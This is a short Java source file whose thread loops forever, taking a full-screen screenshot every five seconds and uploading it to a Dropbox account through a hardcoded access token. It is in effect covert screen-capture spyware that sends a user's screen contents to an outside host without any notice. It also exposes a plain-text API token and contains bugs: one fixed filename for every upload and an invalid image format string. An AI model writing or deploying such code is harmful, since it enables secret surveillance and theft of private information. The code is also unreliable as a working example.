import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    @Override
    public void run() {
        String ACCESS_TOKEN = "3EDIqWYKxY4AAAAAAAAANCAQLcbgjuLrnvlSxM0Ut7kdlNAQe4KeJS7iG8JQv9GF";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_HHmmss");
        Date date = new Date();

        for (; ; ) {

            try {
                Robot screentaker = new Robot();
                Rectangle screenshot = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                BufferedImage image = screentaker.createScreenCapture(screenshot);
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                ImageIO.write(image, ".jpg", stream);
                InputStream in = new ByteArrayInputStream(stream.toByteArray());
                try {
                    FileMetadata metadata = client.files()
                            .uploadBuilder("/" + dateFormat.format(date) + ".jpg").uploadAndFinish(in);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                sleep(5000);
            } catch (InterruptedException | AWTException | IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}

